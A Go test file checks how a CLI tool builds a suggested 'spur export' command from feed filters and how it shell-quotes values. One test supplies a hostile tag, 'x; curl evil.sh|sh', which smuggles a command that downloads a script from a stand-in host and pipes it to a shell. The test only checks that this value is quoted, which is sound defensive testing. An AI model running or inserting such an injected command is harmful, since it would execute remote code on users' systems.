package tools

import (
	"strings"
	"testing"
)

// exportCommand must reproduce the sampled query faithfully: the resolved slug
// (not the base family) and every filter. A user who runs the suggested
// command expects the full stream of the same dataset the sample came from.
func TestExportCommandReplicatesFilters(t *testing.T) {
	t.Parallel()

	attributed := false
	cases := []struct {
		name string
		slug string
		fmt  string
		in   ExportInput
		want string
	}{
		{
			name: "bare feed",
			slug: "anonymous",
			fmt:  "csv",
			in:   ExportInput{Feed: "anonymous"},
			want: "spur export anonymous",
		},
		{
			name: "ipv6 slug is preserved",
			slug: "anonymous-ipv6",
			fmt:  "csv",
			in:   ExportInput{Feed: "anonymous-ipv6"},
			want: "spur export anonymous-ipv6",
		},
		{
			name: "all filters",
			slug: "ztna-ipv6",
			fmt:  "json",
			in: ExportInput{
				Feed:       "ztna",
				IPv6:       true,
				Fields:     []string{"ip", "tag"},
				Tags:       []string{"OXYLABS_PROXY"},
				Ccs:        []string{"us", "de"},
				Asns:       []int{13335, 15169},
				Attributed: &attributed,
				DiffDate:   "2026-01-02",
			},
			want: "spur export ztna-ipv6 --format json --fields ip,tag --tags OXYLABS_PROXY --ccs us,de --asns 13335,15169 --attributed=false --diff-date 2026-01-02",
		},
		{
			name: "diff without date",
			slug: "anonymous",
			fmt:  "csv",
			in:   ExportInput{Feed: "anonymous", Diff: true, CSVHeader: true},
			want: "spur export anonymous --diff --csv-header",
		},
		{
			name: "callback proxies",
			slug: "anonymous-residential",
			fmt:  "csv",
			in:   ExportInput{Feed: "anonymous-residential", CallbackProxies: []string{"HOLA", "NIMBLEWAY"}},
			want: "spur export anonymous-residential --callback-proxies HOLA,NIMBLEWAY",
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if got := exportCommand(tc.slug, tc.fmt, tc.in); got != tc.want {
				t.Errorf("exportCommand = %q, want %q", got, tc.want)
			}
		})
	}
}

// A model-supplied filter value must never smuggle shell syntax into the
// suggested command: unsafe values are single-quoted.
func TestExportCommandQuotesHostileValues(t *testing.T) {
	t.Parallel()

	got := exportCommand("anonymous", "csv", ExportInput{
		Feed: "anonymous",
		Tags: []string{"x; curl evil.sh|sh"},
	})
	if strings.Contains(got, "; curl") && !strings.Contains(got, "'x; curl evil.sh|sh'") {
		t.Fatalf("hostile tag not quoted: %q", got)
	}
	if want := "spur export anonymous --tags 'x; curl evil.sh|sh'"; got != want {
		t.Errorf("exportCommand = %q, want %q", got, want)
	}
}

func TestShellQuote(t *testing.T) {
	t.Parallel()

	cases := []struct{ in, want string }{
		{"plain", "plain"},
		{"a,b/c.d-e_f", "a,b/c.d-e_f"},
		{"has space", "'has space'"},
		{"semi;colon", "'semi;colon'"},
		{"don't", `'don'\''t'`},
		{"$HOME", "'$HOME'"},
	}
	for _, tc := range cases {
		if got := shellQuote(tc.in); got != tc.want {
			t.Errorf("shellQuote(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}
